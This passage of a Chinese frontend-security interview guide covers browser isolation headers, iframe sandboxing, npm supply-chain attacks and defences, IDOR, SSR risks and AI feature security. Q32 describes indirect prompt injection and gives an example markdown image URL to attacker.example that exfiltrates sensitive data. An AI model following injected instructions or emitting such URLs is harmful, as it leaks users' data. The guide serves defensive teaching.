- CORP 防止敏感资源被其他站点加载（配合 Spectre 防护）

**注意**：COOP `same-origin` 会断开 OAuth / 支付弹窗与 opener 的通信 → 使用 `same-origin-allow-popups`。

详见[浏览器原理高级 Q8](../browser/30-senior-qa.md)。

**口述模板（30–60 秒）**

1. 一句话结论：COOP 隔离窗口引用，COEP 要求嵌入的资源明确允许，CORP 是资源声明自己可以被谁加载。
2. 关键机制：COOP 加 COEP 实现跨源隔离，可以使用 SharedArrayBuffer。
3. 对比或注意点：COOP same-origin 会断开 OAuth 弹窗的通信，可以使用 same-origin-allow-popups。
4. 可追问时补充：即使不需要跨源隔离，COOP 和 CORP 也有安全收益。

**常见追问**

- `target="_blank"` 还需要加 `rel="noopener"` 吗？→ 现代浏览器对 `target="_blank"` 默认 noopener；但显式添加仍然是好习惯，并且 COOP 提供了更全面的保护。

### Q20. iframe sandbox 怎么使用？

- **难度**: 中级
- **标签**: iframe, 沙箱

**答案**

```html
<iframe src="https://widgets.example.net/embed" sandbox="allow-scripts allow-forms" allow="clipboard-write"></iframe>
```

`sandbox` 属性默认**禁止一切**，通过 token 按需开放：

| token | 允许 |
|-------|------|
| `allow-scripts` | 执行脚本 |
| `allow-same-origin` | 保持原本的源（否则被视为唯一的不透明源，无法访问 Cookie 和存储） |
| `allow-forms` | 提交表单 |
| `allow-popups` | 打开新窗口 |
| `allow-top-navigation-by-user-activation` | 用户操作后跳转顶层页面 |
| `allow-modals` | `alert` 等 |

**危险组合**：同源内容同时设置 `allow-scripts` 和 `allow-same-origin` → iframe 中的脚本可以**移除自己的 sandbox 属性**，沙箱失效。

**用途**：

- 展示用户生成的 HTML（配合独立域名）
- 嵌入第三方组件
- 预览、在线代码运行（`srcdoc` + sandbox，不加 `allow-same-origin`）

**口述模板（30–60 秒）**

1. 一句话结论：sandbox 属性默认禁止 iframe 的一切能力，通过 token 按需开放。
2. 关键机制：不加 allow-same-origin 时，iframe 被视为唯一的不透明源。
3. 对比或注意点：同源内容同时允许脚本和同源，沙箱可以被自己移除。
4. 可追问时补充：在线代码运行用 srcdoc 加 sandbox，不允许同源。

**常见追问**

- 沙箱 iframe 和主页面怎么通信？→ `postMessage`，主页面校验 `event.source` 是该 iframe（不透明源的 `origin` 是 `"null"`，不能用 origin 区分）。

## 六、供应链

### Q21. npm 供应链攻击有哪些手法？Shai-Hulud 是怎么传播的？

- **难度**: 中级
- **标签**: 供应链

**答案**

**攻击手法**：

| 手法 | 说明 |
|------|------|
| 账号接管 | 钓鱼获取维护者的凭证或 2FA（2025 年 chalk / debug 事件：伪造 npm 支持邮件） |
| 令牌泄露 | CI 日志、公开仓库中的 npm 令牌 |
| **CI / CD 被利用** | 工作流的配置缺陷（`pull_request_target` 执行不可信代码、OIDC 可信发布信任范围过宽） |
| 拼写抢注、依赖混淆 | 名称相似的包、与内部包同名的公共包 |
| 恶意维护者 | 接手了被遗弃的包 |
| **安装脚本** | `preinstall` / `postinstall` 在安装时执行 |

**Shai-Hulud 蠕虫的传播方式（概述）**：

```text
1. 开发者或 CI 安装了被感染的包 → 安装脚本执行
2. 搜索本机的凭证（npm 令牌、GitHub 令牌、云服务凭证）
3. 把凭证外传（例如发布到公开仓库）
4. 用窃取的 npm 令牌，向受害者维护的其他包注入恶意代码并发布新版本
5. 这些包被其他人安装 → 循环
```

**Mini Shai-Hulud（2026）的启示**：项目使用了 OIDC 可信发布（没有长期令牌），但信任配置**没有限制到特定的分支和工作流**，攻击者通过其他工作流获得了发布权限 → 可信发布也需要正确的配置。

**口述模板（30–60 秒）**

1. 一句话结论：供应链攻击的手法包括账号接管、令牌泄露、CI 配置缺陷、拼写抢注和安装脚本。
2. 关键机制：Shai-Hulud 通过安装脚本窃取凭证，并用窃取的令牌发布更多被感染的包，自我传播。
3. 对比或注意点：可信发布不等于安全，信任范围必须限制到特定的分支和工作流。
4. 可追问时补充：npm 的应对包括吊销 classic token、默认不执行依赖的安装脚本。

**常见追问**

- 为什么蠕虫传播这么快？→ 很多维护者维护多个包，一个令牌可以发布几十个包；被感染的包又被大量项目依赖，CI 自动安装放大了传播速度。

### Q22. 团队怎么防御 npm 供应链攻击？

- **难度**: 中级
- **标签**: 供应链

**答案**

**安装环节**：

- 锁文件 + `npm ci` / `--frozen-lockfile`
- **禁止依赖的安装脚本**：pnpm 10 和 npm v12 默认不执行，通过白名单允许必要的包（例如 `esbuild`、`sharp`）
- **依赖冷却期**：pnpm `minimumReleaseAge`、Renovate `minimumReleaseAge`，不安装刚发布几天内的版本
- 使用私有镜像 / 代理仓库，可以拦截已知的恶意包

**监控环节**：

- SCA 工具（Dependabot、Snyk、Socket 等）：已知漏洞 + **恶意行为检测**（新增的网络访问、安装脚本、混淆代码）
- 订阅安全公告

**发布环节**（如果你维护 npm 包）：

- **OIDC 可信发布**，限制到特定的仓库、分支、工作流文件
- 开启 provenance（来源证明）
- 2FA；发布需要人工审批（staged publishing）
- CI 中不使用 `pull_request_target` 执行不可信的代码

**环境隔离**：

- CI 中最小权限的令牌，安装依赖的步骤不接触发布凭证
- 开发者机器：不要长期保存高权限的令牌；容器或开发容器中安装依赖

**应急**：发现被感染时，轮换所有可能泄露的凭证。

**口述模板（30–60 秒）**

1. 一句话结论：从安装、监控、发布、环境隔离四个环节防御。
2. 关键机制：锁文件、禁止依赖的安装脚本、依赖冷却期，是最有效的三项措施。
3. 对比或注意点：发布包时使用可信发布，并限制到特定的分支和工作流。
4. 可追问时补充：安装依赖的环境不接触发布凭证；被感染后轮换所有凭证。

**常见追问**

- 禁用安装脚本后，需要编译原生模块的包怎么办？→ 通过白名单只允许这些包执行脚本（pnpm 的 `onlyBuiltDependencies` 等），并固定版本。

### Q23. 什么是 SBOM 和 provenance？

- **难度**: 中级
- **标签**: 供应链

**答案**

**SBOM（软件物料清单）**：列出软件包含的所有组件和版本（CycloneDX、SPDX 格式）。

- 用途：漏洞爆发时**快速定位**哪些系统受影响（例如 React2Shell 爆发时，查询所有使用了特定版本 `react-server-dom-*` 的应用）
- 生成：`npm sbom`、`cyclonedx-npm`、Syft
- 合规：部分行业和政府采购要求提供

**Provenance（来源证明）**：证明一个包是**由哪个仓库、哪次提交、哪个 CI 工作流**构建并发布的。

- npm 的 provenance 基于 Sigstore 签名，在 npm 网站上显示
- 用户可以验证：`npm audit signatures`
- **局限**：证明了「这个包来自这个工作流」，但如果工作流本身被利用（例如 Mini Shai-Hulud），恶意包同样会有合法的 provenance

**SLSA**：供应链安全的分级框架，provenance 是其中的一部分。

**口述模板（30–60 秒）**

1. 一句话结论：SBOM 是软件包含的组件清单，provenance 证明包是由哪个仓库和工作流构建的。
2. 关键机制：SBOM 让漏洞爆发时快速定位受影响的系统。
3. 对比或注意点：provenance 不能防止工作流本身被利用。
4. 可追问时补充：SLSA 是供应链安全的分级框架。

**常见追问**

- 有了 provenance 是不是就可以完全信任一个包？→ 不能。它只证明来源，不证明代码是安全的；还要结合代码审查、行为检测和维护者的信誉。

### Q24. 怎么安全地引入第三方 CDN 资源？

- **难度**: 中级
- **标签**: 供应链, CDN

**答案**

| 方式 | 安全性 | 说明 |
|------|--------|------|
| **自托管**（打包进自己的产物） | 最高 | 版本固定，经过自己的构建和审查 |
| 公共 CDN + **固定版本** + **SRI** | 较高 | CDN 被篡改时浏览器拒绝执行 |
| 公共 CDN + 浮动版本（`@latest`） | 低 | 无法使用 SRI |
| 动态服务（按浏览器返回不同内容） | 低 | 无法使用 SRI，完全信任服务方（polyfill.io 事件） |

**polyfill.io 事件的教训**：

- 域名和服务被转让给新的所有者，开始向部分用户返回恶意代码
- 引用它的网站没有任何防护
- 应对：移除依赖或替换为可信的镜像；**定期审查第三方域名的所有权和状态**

**配套措施**：

- CSP `script-src` 不使用宽泛的 CDN 白名单
- 监控页面中实际加载的脚本（与预期清单对比）

**口述模板（30–60 秒）**

1. 一句话结论：最安全的是自托管，使用公共 CDN 时固定版本并加 SRI。
2. 关键机制：SRI 让浏览器在内容被篡改时拒绝执行。
3. 对比或注意点：动态服务和浮动版本无法使用 SRI，polyfill.io 就是这种情况。
4. 可追问时补充：定期审查第三方域名的所有权，监控页面实际加载的脚本。

**常见追问**

- 现代项目还需要 polyfill 服务吗？→ 大多数情况下不需要；按目标浏览器在构建时引入（core-js + browserslist）即可。

## 七、访问控制与数据

### Q25. 什么是越权（IDOR）？前端能防吗？

- **难度**: 中级
- **标签**: 访问控制

**答案**

**IDOR（不安全的直接对象引用）**：接口根据请求中的 ID 返回或修改资源，没有检查**当前用户是否有权访问这个资源**。

```text
GET /api/orders/1001   → 自己的订单
GET /api/orders/1002   → 别人的订单（应该返回 403 或 404）
```

**类型**：

- **水平越权**：访问同级别的其他用户的数据
- **垂直越权**：普通用户调用管理员的接口

**前端不能防**：前端隐藏按钮、禁用路由都可以被绕过（直接调用接口）。

**服务端防御**：

- 每个接口检查资源的归属：`WHERE id = ? AND owner_id = 当前用户`
- 集中的授权层（策略引擎），而不是在每个接口中零散判断
- 不可预测的 ID（UUID）只能**增加难度**，不能替代授权检查
- 自动化测试：用 A 用户的令牌访问 B 用户的资源

**前端的职责**：根据权限隐藏 UI（体验）；不在前端存储和判断关键权限数据。

**口述模板（30–60 秒）**

1. 一句话结论：IDOR 是接口根据 ID 返回资源，但不检查当前用户是否有权访问。
2. 关键机制：分为水平越权和垂直越权。
3. 对比或注意点：前端隐藏按钮无法防御，必须在服务端检查资源归属。
4. 可追问时补充：UUID 只能增加难度，不能替代授权检查；集中的授权层比零散判断更可靠。

**常见追问**

- 越权漏洞为什么在 OWASP 中排第一？→ 非常普遍（每个接口都可能遗漏检查），自动化扫描难以发现（需要理解业务），危害大（直接泄露数据）。

### Q26. 敏感数据在前端展示和处理时要注意什么？

- **难度**: 中级
- **标签**: 数据保护, 隐私

**答案**

| 方面 | 措施 |
|------|------|
| **脱敏** | **在服务端脱敏**（手机号 `138****8000`、身份证、银行卡），前端脱敏只是视觉效果，原始数据仍在接口响应中 |
| 查看完整信息 | 需要额外的验证（输入密码），并记录审计日志 |
| 缓存 | 敏感接口 `Cache-Control: no-store`；bfcache 中可能保留页面 |
| 存储 | 不在 localStorage 中存储敏感数据；退出登录时清理所有本地数据 |
| 剪贴板 | 复制敏感信息后提示 |
| 日志和监控 | 错误上报、性能监控、会话回放中**屏蔽**敏感字段（密码、证件号、令牌） |
| URL | 不包含敏感信息（会出现在历史记录、日志、Referer 中） |
| 截图 / 录屏 | 移动端敏感页面可以禁止截图（原生能力） |
| 水印 | 内部系统的页面水印，泄露时可以追溯 |
| 合规 | 个人信息保护法（PIPL）、GDPR：最小必要、用户同意、可删除 |

**口述模板（30–60 秒）**

1. 一句话结论：敏感数据应该在服务端脱敏，前端脱敏只是视觉效果。
2. 关键机制：查看完整信息需要额外验证和审计。
3. 对比或注意点：错误上报和会话回放中要屏蔽敏感字段。
4. 可追问时补充：退出登录时清理本地数据，内部系统加水印用于追溯。

**常见追问**

- 会话回放工具有什么风险？→ 可能录制到密码、证件号等输入内容；需要默认屏蔽所有输入框，只开放必要的元素。

### Q27. 怎么防止接口被恶意刷（爬虫、薅羊毛、撞库）？

- **难度**: 中级
- **标签**: 风控, 反爬

**答案**

**分层防护**：

| 层 | 措施 |
|----|------|
| 网关 | 按 IP、用户、设备限流；WAF 规则；已知恶意 IP |
| 人机验证 | 滑块、图形验证码、无感验证（Turnstile、reCAPTCHA 等）在可疑时触发 |
| 设备指纹 | 识别同一设备的大量账号（注意隐私合规） |
| 行为分析 | 鼠标轨迹、点击间隔、请求模式 |
| 业务规则 | 新用户限制、领取次数、关联账号检测 |
| 前端成本手段 | 请求签名、代码混淆、环境检测 → **只能提高成本** |

**撞库防护**（用泄露的账号密码批量尝试登录）：

- 登录接口按账号和 IP 限流，失败多次后要求验证码
- 检查密码是否出现在已知的泄露库中（Have I Been Pwned 的 k-匿名接口）
- 异地登录提醒、MFA

**原则**：没有一劳永逸的方案，是**攻防的成本博弈**；核心判断在服务端，前端的手段作为辅助。

**口述模板（30–60 秒）**

1. 一句话结论：防刷是分层的成本博弈，包括限流、人机验证、设备指纹、行为分析和业务规则。
2. 关键机制：可疑时才触发人机验证，减少对正常用户的影响。
3. 对比或注意点：前端的签名和混淆只能提高成本，核心判断在服务端。
4. 可追问时补充：撞库防护要按账号和 IP 限流，检查密码是否已泄露。

**常见追问**

- 为什么按 IP 限流不够？→ 攻击者使用代理池和大量 IP；运营商级 NAT 下大量正常用户共享 IP，严格限流会误伤。

## 八、工程实践

### Q28. 安全测试有哪些类型？前端怎么接入？

- **难度**: 中级
- **标签**: 安全测试

**答案**

| 类型 | 原理 | 前端工具 / 实践 |
|------|------|-----------------|
| **SAST**（静态分析） | 分析源码中的危险模式 | ESLint 安全插件（`eslint-plugin-security`、`no-unsanitized`）、Semgrep、CodeQL |
| **SCA**（依赖分析） | 检查依赖的已知漏洞和恶意包 | `npm audit`、Dependabot、Snyk、Socket |
| **密钥扫描** | 检测提交和产物中的密钥 | gitleaks、GitHub Secret Scanning、推送保护 |
| **DAST**（动态测试） | 对运行中的应用发起测试 | OWASP ZAP、Burp Suite |
| 安全头检查 | 检查响应头配置 | Mozilla Observatory、CI 中的自定义检查 |
| 渗透测试 | 人工测试 | 定期或上线前 |
| 漏洞赏金 | 外部研究者 | SRC（安全应急响应中心） |

**接入 CI 的原则**：

- 高置信度的规则**阻断**合并，低置信度的规则只报告
- 新代码严格，存量问题逐步治理（基线）
- 结果要有负责人和处理时限

**口述模板（30–60 秒）**

1. 一句话结论：安全测试包括 SAST、SCA、密钥扫描、DAST 和渗透测试。
2. 关键机制：前端用 ESLint 安全插件做静态分析，用 Dependabot 等做依赖分析。
3. 对比或注意点：高置信度的规则阻断合并，存量问题通过基线逐步治理。
4. 可追问时补充：密钥扫描要在推送时就拦截。

**常见追问**

- 安全扫描误报太多，团队不想用怎么办？→ 调整规则只保留高置信度的、建立基线只看新增、提供修复建议和示例，让安全工具成为助力而不是负担。

### Q29. SSR 应用有哪些特有的安全风险？

- **难度**: 中级
- **标签**: SSR

**答案**

| 风险 | 说明 | 措施 |
|------|------|------|
| **状态序列化注入** | 服务端数据序列化到 HTML 中时没有转义 `</script>` | 使用 `devalue`、`serialize-javascript` 或框架内置的安全序列化 |
| **数据泄露** | 传给客户端组件的 props 包含敏感字段 | DTO、`server-only` |
| **跨请求状态污染** | 模块级的单例在多个请求之间共享（用户 A 的数据出现在用户 B 的页面中） | 每个请求创建新的 store / 上下文 |
| **SSRF** | 服务端根据参数抓取数据 | 见 Q16 |
| **缓存泄露** | 包含用户数据的页面被 CDN 或框架缓存 | 个性化页面 `private` / `no-store`；框架缓存不包含用户数据 |
| 服务端组件 / Action 的鉴权 | 公开端点 | 每个 Action 都检查 |
| **框架漏洞** | React2Shell、middleware 绕过 | 依赖监控、快速升级 |
| 错误信息泄露 | 服务端错误的堆栈返回给用户 | 生产环境只返回通用错误 |

**口述模板（30–60 秒）**

1. 一句话结论：SSR 特有的风险包括状态序列化注入、数据泄露、跨请求状态污染和缓存泄露。
2. 关键机制：序列化数据到 HTML 中要使用安全的序列化库。
3. 对比或注意点：模块级单例在服务端是多个请求共享的，会导致用户数据串号。
4. 可追问时补充：服务端组件和 Action 都是公开端点，框架漏洞需要快速升级。

**常见追问**

- 跨请求状态污染为什么危险？→ 用户 A 的个人信息可能被渲染到用户 B 的页面中，是严重的隐私泄露，而且很难复现。

### Q30. 怎么处理安全相关的错误和异常？

- **难度**: 中级
- **标签**: 错误处理

**答案**

**OWASP Top 10:2025 新增 A10「异常情况处理不当」**，关注：

| 问题 | 例子 | 正确做法 |
|------|------|----------|
| **失败时放行**（fail open） | 鉴权服务超时时默认允许访问 | **失败时拒绝**（fail closed） |
| 错误信息泄露 | 返回堆栈、SQL 语句、内部路径 | 返回通用信息 + 错误 ID，详情记录在日志中 |
| 未捕获的异常 | 进程崩溃 → 拒绝服务 | 全局错误处理、进程守护 |
| 忽略返回值 | 签名校验函数返回 false 但没有检查 | 校验失败必须中断流程 |
| 资源未清理 | 异常时连接、锁没有释放 | `finally`、`using`（显式资源管理） |
| 不一致的状态 | 扣款成功但订单创建失败 | 事务、补偿机制 |

**前端相关**：

- 鉴权检查失败时（网络错误）不要默认显示受保护的内容
- 错误边界中不要展示原始的错误信息给用户
- 错误上报时屏蔽敏感数据

**口述模板（30–60 秒）**

1. 一句话结论：OWASP 2025 新增的 A10 关注异常处理不当，核心是失败时要拒绝而不是放行。
2. 关键机制：错误信息只返回通用信息和错误 ID，详情记录在日志中。
3. 对比或注意点：校验函数的返回值必须检查，异常时要清理资源。
4. 可追问时补充：前端在鉴权检查失败时不要默认显示受保护的内容。

**常见追问**

- 限流服务（Redis）不可用时应该放行还是拒绝？→ 取决于业务：一般接口可以放行（可用性优先）并告警；登录、支付等高风险接口应该拒绝或降级到本地限流。

### Q31. 浏览器扩展对网页安全有什么影响？

- **难度**: 中级
- **标签**: 浏览器扩展

**答案**

- 拥有页面权限的扩展可以**读取和修改页面内容**（包括密码输入框）、注入脚本
- 恶意或被收购后变为恶意的扩展：窃取数据、注入广告、劫持搜索
- 网站**无法阻止**扩展的内容脚本（它们运行在隔离的环境中，CSP 对其不完全适用）

**对网站的影响**：

- CSP 报告中的大量噪音
- 页面行为异常（扩展修改了 DOM）→ hydration 错误
- 用户数据被窃取，用户却认为是网站的问题

**网站可以做的**：

- 敏感操作使用服务端的二次验证（扩展可以自动操作页面，但无法通过 Passkey 等设备绑定的验证）
- 监控异常的 DOM 修改（例如支付页面中被注入的表单字段）
- 企业环境：通过浏览器策略管理允许的扩展
- 教育用户

**口述模板（30–60 秒）**

1. 一句话结论：有页面权限的扩展可以读取和修改页面内容，网站无法阻止。
2. 关键机制：扩展的内容脚本运行在隔离环境中，CSP 对其不完全适用。
3. 对比或注意点：会产生 CSP 报告噪音和 hydration 错误。
4. 可追问时补充：敏感操作使用设备绑定的验证，支付页面监控异常的 DOM 修改。

**常见追问**

- 怎么区分 CSP 报告中的扩展噪音？→ 被阻止的地址或源文件以 `chrome-extension://`、`moz-extension://` 开头，或者报告中的脚本来源不在自己的资源清单中。

### Q32. 在 AI 功能中，前端需要注意哪些安全问题？

- **难度**: 中级
- **标签**: AI, 安全

**答案**

| 风险 | 说明 | 措施 |
|------|------|------|
| **模型输出导致 XSS** | 模型输出的 Markdown / HTML 中包含恶意内容（可能来自提示词注入） | 渲染时清洗，禁用原始 HTML；链接和图片校验协议 |
| **间接提示词注入** | 模型读取的网页、文档、邮件中藏有指令，让模型执行非预期的操作 | 不可信内容与系统指令分离；工具调用需要权限和用户确认 |
| **数据外泄** | 注入的指令让模型把敏感数据编码到图片 URL 中（渲染时自动请求） | 图片只允许可信的域名；CSP `img-src` 限制 |
| API 密钥泄露 | 前端直接调用模型 API | 密钥只在服务端，通过 BFF 调用 |
| 成本滥用 | 恶意用户大量调用 | 鉴权、限流、额度 |
| 越权的工具调用 | 模型调用了用户没有权限的操作 | 工具在服务端执行，以**当前用户的权限**检查 |
| 隐私 | 用户输入的敏感数据被发送给第三方模型 | 告知用户、脱敏、选择合规的服务 |

**原则**：把模型的输出当作**不可信的用户输入**处理。

**口述模板（30–60 秒）**

1. 一句话结论：把模型的输出当作不可信的用户输入，渲染时清洗。
2. 关键机制：间接提示词注入可以让模型执行非预期的操作或外泄数据。
3. 对比或注意点：图片只允许可信域名，防止通过图片 URL 外泄数据。
4. 可追问时补充：工具调用在服务端以当前用户的权限检查，有副作用的操作需要用户确认。

**常见追问**

- 为什么图片渲染会导致数据外泄？→ 注入的指令让模型输出 `![](https://attacker.example/?d=敏感数据)`，前端渲染图片时浏览器自动发出请求，数据就被发送出去了。
